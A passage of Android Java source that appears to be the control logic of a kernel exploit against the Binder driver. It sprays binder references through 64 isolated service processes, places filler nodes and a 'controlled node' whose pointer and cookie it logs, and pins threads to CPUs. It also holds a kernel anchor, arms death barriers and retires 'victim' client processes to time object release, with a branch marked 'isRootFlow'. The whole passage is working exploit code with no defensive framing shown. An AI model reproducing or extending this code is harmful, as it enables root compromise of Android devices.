                rawTargetStart != rawTargetProcessIdentity.startTime) {
            return "status=fail stage=raw-target reason=pid";
        }
        writePrivate("raw-target.start",
                "status=pass stage=raw-target-start");
        return "status=pass stage=raw-target blocked=" +
                RawTargetService.BLOCKER_COUNT + " pid=" + rawTargetPid;
    }

    private String retainControlledNode(List<IBinder> controllers)
            throws Exception {
        if (fillerNodes == null || fillerNodes.length <
                controllers.size() * FILLERS_PER_PROCESS) {
            return "status=fail stage=binder-ref-spray reason=fillers";
        }
        int cpu = NativeBridge.pinCurrentThread(2);
        int retained = 0;
        Set<Integer> pids = new HashSet<>();
        for (int controllerIndex = 0;
             controllerIndex < controllers.size(); controllerIndex++) {
            IBinder controller = controllers.get(controllerIndex);
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInt(FILLERS_PER_PROCESS);
                int first = controllerIndex * FILLERS_PER_PROCESS;
                for (int index = 0; index < FILLERS_PER_PROCESS; index++) {
                    data.writeStrongBinder(fillerNodes[first + index]);
                }
                data.writeStrongBinder(controlledNode);
                if (!controller.transact(
                        IsolatedRefService.TRANSACTION_RETAIN_BATCH,
                        data, reply, 0)) {
                    break;
                }
                reply.readException();
                int pid = reply.readInt();
                pids.add(pid);
                synchronized (isolatedPids) {
                    isolatedPids.add(pid);
                }
                if (reply.readInt() != FILLERS_PER_PROCESS + 1) {
                    break;
                }
                retained++;
            } finally {
                reply.recycle();
                data.recycle();
            }
        }
        boolean pass = retained == controllers.size() &&
                pids.size() == controllers.size() && cpu == 2;
        return "status=" + (pass ? "pass" : "fail") +
                " stage=binder-ref-spray requested=" + controllers.size() +
                " retained=" + retained + " unique_pids=" + pids.size() +
                " fillers=" + (controllers.size() * FILLERS_PER_PROCESS) +
                " cpu=" + cpu + " controlled_ptr=0x" +
                Long.toHexString(controlledPointer) +
                " controlled_cookie=0x" +
                Long.toHexString(controlledCookie);
    }

    private String retainRawControlledNode(List<IBinder> controllers)
            throws Exception {
        IBinder service = rawClientService;
        if (service == null || controllers.size() != 64) {
            return "status=fail stage=raw-client-ref-spray reason=preflight";
        }
        int pinned = 0;
        Set<Integer> pinnedPids = new HashSet<>();
        for (IBinder controller : controllers) {
            Parcel pinData = Parcel.obtain();
            Parcel pinReply = Parcel.obtain();
            try {
                if (!controller.transact(IsolatedRefService.TRANSACTION_PIN,
                        pinData, pinReply, 0)) {
                    break;
                }
                pinReply.readException();
                int pid = pinReply.readInt();
                int cpu = pinReply.readInt();
                if (pid <= 0 || cpu < 0 || !pinnedPids.add(pid)) {
                    break;
                }
                pinned++;
            } finally {
                pinReply.recycle();
                pinData.recycle();
            }
        }
        if (pinned != controllers.size()) {
            return "status=fail stage=raw-client-ref-spray reason=pin" +
                    " pinned=" + pinned;
        }
        if (fillerNodes == null || fillerNodes.length <
                controllers.size() * FILLERS_PER_PROCESS) {
            return "status=fail stage=raw-client-ref-spray reason=fillers";
        }
        int prepared = 0;
        int retained = 0;
        int anchorRetained = 0;
        int[] controllerPids = new int[controllers.size()];
        for (int index = 0; index < controllerPids.length; index++) {
            controllerPids[index] = -1;
        }
        int[] extraLimits = new int[RAW_VICTIM_COUNT - 1];
        boolean[] deathLinked = new boolean[RAW_VICTIM_COUNT - 1];
        int[] extraRetained = new int[extraLimits.length];
        List<IBinder> extraServices;
        synchronized (extraRawClientLock) {
            if (extraRawClientSlots.length != RAW_VICTIM_COUNT - 1) {
                return "status=fail stage=raw-client-ref-spray " +
                        "reason=extra-slot-count";
            }
            extraServices = new ArrayList<>(0);
            for (RawClientSlot slot : extraRawClientSlots) {
                if (slot.state != RawClientSlotState.EMPTY ||
                        slot.connection != null || slot.bound ||
                        slot.unbinding || slot.service != null) {
                    return "status=fail stage=raw-client-ref-spray " +
                        "reason=extra-client index=" + slot.index;
                }
            }
        }
        Set<Integer> pids = new HashSet<>();
        for (int controllerIndex = 0;
             controllerIndex < controllers.size(); controllerIndex++) {
            int controllerPid = -1;
            int retainedInController = 0;
            Parcel targetData = Parcel.obtain();
            Parcel targetReply = Parcel.obtain();
            try {
                targetData.writeInt(1);
                targetData.writeInt(1);
                targetData.writeInt(0);
                targetData.writeStrongBinder(controllers.get(controllerIndex));
                if (!service.transact(RawBClientService.TRANSACTION_RETAIN,
                        targetData, targetReply, 0)) {
                    break;
                }
                targetReply.readException();
                String state = targetReply.readString();
                int count = targetReply.readInt();
                controllerPid = count == 1 ? targetReply.readInt() : -1;
                if (state == null || !state.startsWith("status=pass") ||
                        count != 1 || controllerPid <= 0 ||
                        !pids.add(controllerPid)) {
                    break;
                }
                controllerPids[controllerIndex] = controllerPid;
                retained++;
                retainedInController++;
            } finally {
                targetReply.recycle();
                targetData.recycle();
            }
            Parcel anchorData = Parcel.obtain();
            Parcel anchorReply = Parcel.obtain();
            try {
                anchorData.writeStrongBinder(kernelAnchor);
                if (!controllers.get(controllerIndex).transact(
                        IsolatedRefService.TRANSACTION_RETAIN_DEATH,
                        anchorData, anchorReply, 0)) {
                    break;
                }
                anchorReply.readException();
                int pid = anchorReply.readInt();
                int count = anchorReply.readInt();
                if (pid != controllerPid ||
                        count != retainedInController + 1) {
                    break;
                }
                anchorRetained++;
                retainedInController++;
            } finally {
                anchorReply.recycle();
                anchorData.recycle();
            }
            Parcel prepareData = Parcel.obtain();
            Parcel prepareReply = Parcel.obtain();
            try {
                prepareData.writeInt(FILLERS_PER_PROCESS);
                int first = controllerIndex * FILLERS_PER_PROCESS;
                for (int index = 0; index < FILLERS_PER_PROCESS; index++) {
                    prepareData.writeStrongBinder(fillerNodes[first + index]);
                }
                if (!controllers.get(controllerIndex).transact(
                        IsolatedRefService.TRANSACTION_PREPARE,
                        prepareData, prepareReply, 0)) {
                    break;
                }
                prepareReply.readException();
                int pid = prepareReply.readInt();
                int count = prepareReply.readInt();
                if (pid != controllerPid || count !=
                        retainedInController + FILLERS_PER_PROCESS) {
                    break;
                }
                prepared++;
                retainedInController = count;
            } finally {
                prepareReply.recycle();
                prepareData.recycle();
            }
            for (int extraIndex = 0;
                 extraIndex < extraServices.size() &&
                 extraIndex < extraLimits.length; extraIndex++) {
                if (controllerIndex >= extraLimits[extraIndex]) {
                    continue;
                }
                Parcel extraData = Parcel.obtain();
                Parcel extraReply = Parcel.obtain();
                try {
                    retainedInController++;
                    extraData.writeInt(1);
                    extraData.writeInt(retainedInController);
                    extraData.writeInt(deathLinked[extraIndex] ? 1 : 0);
                    extraData.writeStrongBinder(
                            controllers.get(controllerIndex));
                    if (!extraServices.get(extraIndex).transact(
                            RawBClientService.TRANSACTION_RETAIN,
                            extraData, extraReply, 0)) {
                        break;
                    }
                    extraReply.readException();
                    String state = extraReply.readString();
                    int count = extraReply.readInt();
                    int pid = count == 1 ? extraReply.readInt() : -1;
                    if (state == null || !state.startsWith("status=pass") ||
                            count != 1 || pid != controllerPid) {
                        break;
                    }
                    extraRetained[extraIndex]++;
                } finally {
                    extraReply.recycle();
                    extraData.recycle();
                }
            }
        }
        boolean pass = prepared == controllers.size() &&
                retained == controllers.size() &&
                pids.size() == controllers.size() &&
                pinnedPids.equals(pids) &&
                anchorRetained == controllers.size();
        for (int index = 0; pass && index < extraServices.size(); index++) {
            pass = index < extraLimits.length &&
                    extraRetained[index] == extraLimits[index];
        }
        List<IsolatedControllerPair> candidatePairs = new ArrayList<>();
        Set<IBinder> uniqueControllers = new HashSet<>();
        Set<Integer> controllerPidSet = new HashSet<>();
        if (pass) {
            for (int index = 0; index < controllers.size(); index++) {
                int pid = controllerPids[index];
                if (pid <= 0 || !uniqueControllers.add(controllers.get(index)) ||
                        !controllerPidSet.add(pid)) {
                    pass = false;
                    break;
                }
                long deathBarrier = NativeBridge.armBinderDeathBarrier(
                        controllers.get(index));
                if (deathBarrier == 0) {
                    pass = false;
                    break;
                }
                candidatePairs.add(new IsolatedControllerPair(
                        controllers.get(index), pid, deathBarrier));
            }
            pass = pass && candidatePairs.size() == 64 &&
                    controllerPidSet.size() == 64 &&
                    pinnedPids.equals(pids) && pids.equals(controllerPidSet);
        }
        String retirementRecord =
                "status=pass stage=isolated-retirement-record skipped=1";
        if (pass && isRootFlow()) {
            int[] recordedPids = new int[pids.size()];
            int pidIndex = 0;
            for (int pid : pids) {
                recordedPids[pidIndex++] = pid;
            }
            retirementRecord = NativeBridge.recordIsolatedProcesses(
                    isolatedRetirementGeneration, recordedPids);
            pass = retirementRecord.startsWith("status=pass");
        }
        boolean recordedNativePass = retirementRecord.startsWith("status=pass");
        if (pass && recordedNativePass) {
            synchronized (isolatedPids) {
                isolatedPids.clear();
                isolatedPids.addAll(pids);
            }
            isolatedControllerPairs = Collections.unmodifiableList(
                    new ArrayList<>(candidatePairs));
        } else {
            for (IsolatedControllerPair pair : candidatePairs) {
                if (pair.deathBarrier != 0) {
                    NativeBridge.discardBinderDeathBarrier(
                            pair.deathBarrier);
                    pair.deathBarrier = 0;
                }
            }
        }
        kernelAnchorRetained = pass ? anchorRetained : 0;
        return "status=" + (pass ? "pass" : "fail") +
                " stage=raw-client-ref-spray requested=" +
                controllers.size() + " retained=" + retained +
                " unique_pids=" + pids.size() + " pinned=" + pinned +
                " anchors=" + anchorRetained +
                " fillers=" + (prepared * FILLERS_PER_PROCESS) +
                " retirement_record=[" + retirementRecord + "]" +
                " extra0=" + extraRetained[0] +
                " extra1=" + extraRetained[1] +
                " extra2=" + extraRetained[2] +
                " extra3=" + extraRetained[3];
    }

    private String retainKernelAnchor(List<IBinder> controllers, int count)
            throws Exception {
        if (count <= 0 || count > controllers.size()) {
            return "status=fail stage=anchor-retain reason=preflight";
        }
        return retainKernelAnchor(count);
    }

    private String retainKernelAnchor(int count) throws Exception {
        if (count <= 0 || kernelAnchorRetained != count) {
            return "status=fail stage=anchor-retain reason=preflight";
        }
        int retained = kernelAnchorRetained;
        CountDownLatch connected = new CountDownLatch(1);
        anchorHolderConnection = new ServiceConnection() {
            @Override
            public void onServiceConnected(ComponentName name,
                                           IBinder service) {
                anchorHolderService = service;
                anchorHolderProcessIdentity = queryServiceIdentity(service,
                        AnchorHolderService.TRANSACTION_IDENTITY);
                anchorHolderPid = anchorHolderProcessIdentity == null
                        ? -1 : anchorHolderProcessIdentity.pid;
                connected.countDown();
            }

            @Override
            public void onServiceDisconnected(ComponentName name) {
                anchorHolderService = null;
                anchorHolderPid = -1;
            }
        };
        boolean bound = bindService(new Intent(this,
                        AnchorHolderService.class), anchorHolderConnection,
                Context.BIND_AUTO_CREATE);
        if (!bound || !connected.await(30, TimeUnit.SECONDS) ||
                anchorHolderService == null) {
            return "status=fail stage=anchor-retain reason=holder-bind";
        }
        int holderRetained = 0;
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeStrongBinder(kernelAnchor);
            if (anchorHolderService.transact(
                    AnchorHolderService.TRANSACTION_RETAIN,
                    data, reply, 0)) {
                reply.readException();
                holderRetained = reply.readInt();
            }
        } finally {
            reply.recycle();
            data.recycle();
        }
        boolean pass = retained == count && holderRetained == 1;
        if (pass) {
            writePrivate("binder-ref.anchor-retained",
                    "status=pass stage=anchor-retain");
        }
        return "status=" + (pass ? "pass" : "fail") +
                " stage=anchor-retain isolated=" + retained +
                " expected=" + count + " holder=" + holderRetained;
    }

    private String queueRawClientAndWaitExit() throws Exception {
        IBinder service;
        int pid;
        ProcessIdentity identity;
        ServiceConnection clientConnection;
        synchronized (this) {
            service = rawClientService;
            pid = rawClientPid;
            identity = rawClientProcessIdentity;
            clientConnection = rawClientConnection;
        }
        if (service == null || pid <= 0 || identity == null ||
                identity.pid != pid || clientConnection == null ||
                !isOriginalIdentityLive(identity)) {
            return "status=fail stage=raw-client-exit reason=preflight";
        }
        ProcessIdentity observed = queryServiceIdentity(service,
                RawBClientService.TRANSACTION_IDENTITY);
        if (observed == null || observed.pid != identity.pid ||
                observed.startTime != identity.startTime) {
            return "status=fail stage=raw-client-exit reason=replaced";
        }
        File queued = new File(getFilesDir(), "raw-client.queued");
        if ((queued.exists() && !queued.delete()) || queued.exists()) {
            return "status=fail stage=raw-client-release " +
                    "reason=stale-marker";
        }
        int releaseCoordinatorCpu = rawCohortSiblings != null
                ? NativeBridge.pinCurrentThread(1) : -1;
        if (rawCohortSiblings != null && releaseCoordinatorCpu != 1) {
            return "status=fail stage=raw-client-release reason=cpu cpu=" +
                    releaseCoordinatorCpu;
        }
        synchronized (this) {
            if (rawClientService != service || rawClientPid != pid ||
                    rawClientProcessIdentity != identity ||
                    rawClientConnection != clientConnection ||
                    !rawClientBound || rawClientUnbinding ||
                    rawClientConnectionFailed) {
                return "status=fail stage=raw-client-exit reason=changed";
            }
            rawClientRetiring = rawCohortSiblings == null;
        }
        Parcel data = Parcel.obtain();
        try {
            if (!service.transact(
                    RawBClientService.TRANSACTION_QUEUE_AND_EXIT,
                    data, null, IBinder.FLAG_ONEWAY)) {
                return "status=fail stage=raw-client-exit " +
                        "reason=transaction";
            }
        } finally {
            data.recycle();
        }
        for (int attempt = 0;
             attempt < 500 && !queued.exists(); attempt++) {
            Thread.sleep(10);
        }
        if (!queued.exists()) {
            return "status=fail stage=raw-client-release " +
                    "reason=queue-state pid=" + pid;
        }
        String queueState = readSmall(queued);
        if (rawCohortSiblings != null &&
                (!queueState.startsWith(
                        "status=pass stage=raw-client-queue pid=" + pid + " ") ||
                 !queueState.contains("cohort=96") ||
                 !queueState.contains("ordered=1") ||
                 !queueState.contains("queued=0") ||
                 !queueState.contains("released=0") ||
                 !queueState.contains("released_handles=96") ||
                 !queueState.contains("explicit_release_all=1") ||
                 !queueState.contains("release_cpu=2") ||
                 !queueState.contains("migrated=1") ||
                 !queueState.contains("selected_gone=1") ||
                 !queueState.contains("post_cpu=1"))) {
            return "status=fail stage=raw-client-release state=[" +
                    queueState + "]";
        }
        if (rawCohortSiblings != null) {
            ProcessIdentity liveIdentity = queryServiceIdentity(service,
                    RawBClientService.TRANSACTION_IDENTITY);
            boolean clientLive = liveIdentity != null &&
                    liveIdentity.pid == identity.pid &&
                    liveIdentity.startTime == identity.startTime &&
                    isOriginalIdentityLive(identity);
            return clientLive
                    ? queueState + " client_live=1 explicit_release=1" +
                            " coordinator_cpu=" + releaseCoordinatorCpu
                    : "status=fail stage=raw-client-release state=[" +
                            queueState + "] client_live=0";
        }
        for (int attempt = 0;
             attempt < 500 && isOriginalIdentityLive(identity); attempt++) {
            Thread.sleep(10);
        }
        if (isOriginalIdentityLive(identity)) {
            return "status=fail stage=raw-client-exit reason=live pid=" + pid;
        }
        if (!unbindMainRawClientConnection(clientConnection)) {
            return "status=fail stage=raw-client-exit reason=unbind";
        }
        synchronized (this) {
            if (rawClientConnection != null || rawClientBound ||
                    rawClientUnbinding) {
                rawClientConnectionFailed = true;
                return "status=fail stage=raw-client-exit reason=bound";
            }
            rawClientService = null;
            rawClientPid = -1;
            rawClientProcessIdentity = null;
            rawClientConnectedOnce = false;
            rawClientRetiring = false;
        }
        if (queueState.startsWith("status=pass")) {
            Thread.sleep(1500);
            return queueState + " client_dead=1 deferred_settle_ms=1500" +
                    (rawCohortSiblings == null ? "" :
                            " coordinator_cpu=" + releaseCoordinatorCpu);
        }
        return "status=fail stage=raw-client-exit queue=[" + queueState +
                "] client_dead=1";
    }

    private String settleRawCohort() throws Exception {
        IBinder target = rawTargetService;
        if (target == null) {
            return "status=fail stage=raw-cohort-settle reason=target";
        }
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            if (!target.transact(
                    RawTargetService.TRANSACTION_COHORT_SETTLE,
                    data, reply, 0)) {
                return "status=fail stage=raw-cohort-settle " +
                        "reason=transaction";
            }
            reply.readException();
            if (reply.readInt() != 1) {
                return "status=fail stage=raw-cohort-settle reason=reply";
            }
        } finally {
            reply.recycle();
            data.recycle();
        }
        File result = new File(getFilesDir(),
                "raw-cohort-settle.result");
        waitForEither(result, null, 5000);
        return readSmall(result);
    }

    private String queueExtraRawClientAndWaitExit(int index)
            throws Exception {
        if (rawVictimContextsActive) {
            if (index < 0 || index >= RAW_VICTIM_COUNT - 1) {
                return "status=fail stage=raw-client-exit" +
                        " mode=native-context reason=index";
            }
            String retired = NativeBridge.queueAndRetireRawVictimContext(
                    index + 1);
            return retired.startsWith("status=pass")
                    ? retired
                    : "status=fail stage=raw-client-exit" +
                            " mode=native-context native=[" + retired + "]";
        }
        RawClientSlot slot;
        int pid;
        ProcessIdentity identity;
        ServiceConnection slotConnection;
        long deathBarrier;
        synchronized (extraRawClientLock) {
            if (index < 0 || index >= extraRawClientSlots.length) {
                return "status=fail stage=raw-client-exit reason=index";
            }
            slot = extraRawClientSlots[index];
            pid = slot.pid;
            identity = slot.identity;
            slotConnection = slot.connection;
            deathBarrier = slot.deathBarrier;
            if (slot.state != RawClientSlotState.ACTIVE || pid <= 0 ||
                    identity == null || identity.pid != pid ||
                    slotConnection == null || !slot.bound ||
                    slot.unbinding || slot.service == null ||
                    !isOriginalIdentityLive(identity) || deathBarrier == 0) {
                return "status=fail stage=raw-client-exit reason=preflight";
            }
            slot.state = RawClientSlotState.RETIRING;
            slot.deathBarrier = 0;
        }
        File result = new File(getFilesDir(),
                "raw-client.result." + pid);
        result.delete();
        writePrivate("raw-extra-queue.enable." + index,
                "status=pass stage=raw-extra-queue-enable");
        String death = NativeBridge.awaitBinderDeathBarrier(
                deathBarrier, 5000);
        boolean deathPassed = death.startsWith(
                "status=pass stage=binder-death-barrier ");
        for (int attempt = 0; deathPassed &&
                attempt < 500 && isOriginalIdentityLive(identity); attempt++) {
            Thread.sleep(10);
        }
        boolean dead = !isOriginalIdentityLive(identity);
        boolean passed = result.exists() &&
                readSmall(result).startsWith("status=pass");
        if (dead && passed && deathPassed) {
            if (!unbindExtraRawClientSlot(slot, slotConnection)) {
                return "status=fail stage=raw-client-exit index=" + index +
                        " pid=" + pid + " reason=unbind";
            }
            synchronized (extraRawClientLock) {
                if (slot.state != RawClientSlotState.RETIRING ||
                        slot.connection != null || slot.bound ||
                        slot.unbinding) {
                    slot.state = RawClientSlotState.FAILED;
                    return "status=fail stage=raw-client-exit index=" +
                            index + " pid=" + pid + " reason=bound";
                }
                slot.service = null;
                slot.pid = -1;
                slot.identity = null;
                slot.state = RawClientSlotState.CONSUMED;
            }
        } else {
            unbindExtraRawClientSlot(slot, slotConnection);
            synchronized (extraRawClientLock) {
                slot.state = RawClientSlotState.FAILED;
            }
        }
        return "status=" +
                (dead && passed && deathPassed ? "pass" : "fail") +
                " stage=raw-client-exit index=" + index +
                " pid=" + pid + " dead=" + (dead ? 1 : 0) +
                " result=" + (passed ? 1 : 0) +
                " death=[" + death + "]";
    }

    private void abortRawClient() {
        IBinder service = rawClientService;
        if (service == null) {
            return;
        }
        Parcel data = Parcel.obtain();
        try {
            service.transact(RawBClientService.TRANSACTION_ABORT,
                    data, null, IBinder.FLAG_ONEWAY);
        } catch (Exception ignored) {
        } finally {
            data.recycle();
        }
    }

    private void waitForIsolatedExit(int timeoutMs) throws Exception {
        int attempts = Math.max(1, timeoutMs / 20);
        for (int attempt = 0; attempt < attempts; attempt++) {
            boolean live = false;
            synchronized (isolatedPids) {
                for (int pid : isolatedPids) {
                    if (new File("/proc/" + pid).exists()) {
                        live = true;
                        break;
                    }
                }
            }
            if (!live) {
                return;
            }
            Thread.sleep(20);
        }
        throw new IllegalStateException("isolated-exit-timeout");
    }

    private ProcessIdentity queryServiceIdentity(IBinder service,
                                                 int transaction) {
        if (service == null) {
            return null;
        }
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            if (!service.transact(transaction, data, reply, 0)) {
                return null;
            }
            reply.readException();
            int pid = reply.readInt();
            long startTime = reply.readLong();
            return pid > 0 && pid != Process.myPid() && startTime > 0
                    ? new ProcessIdentity(pid, startTime) : null;
        } catch (Exception exception) {
            return null;
        } finally {
            reply.recycle();
            data.recycle();
        }
    }

    private void writePrivate(String name, String value) throws Exception {
        File file = new File(getFilesDir(), name);
        try (FileOutputStream stream = new FileOutputStream(file, false)) {
            stream.write((value + "\n").getBytes(StandardCharsets.UTF_8));
            stream.getFD().sync();
        }
    }

    private void writePrivateAtomic(String name, String value)
            throws Exception {
        File file = new File(getFilesDir(), name);
        File temporary = new File(getFilesDir(), name + ".tmp." +
                Process.myPid() + "." + Process.myTid());
        try {
            try (FileOutputStream stream =
                         new FileOutputStream(temporary, false)) {
                stream.write((value + "\n").getBytes(
                        StandardCharsets.UTF_8));
                stream.getFD().sync();
            }
            Files.move(temporary.toPath(), file.toPath(),
                    StandardCopyOption.ATOMIC_MOVE,
                    StandardCopyOption.REPLACE_EXISTING);
        } catch (Exception exception) {
            temporary.delete();
            throw exception;
        }
    }
}
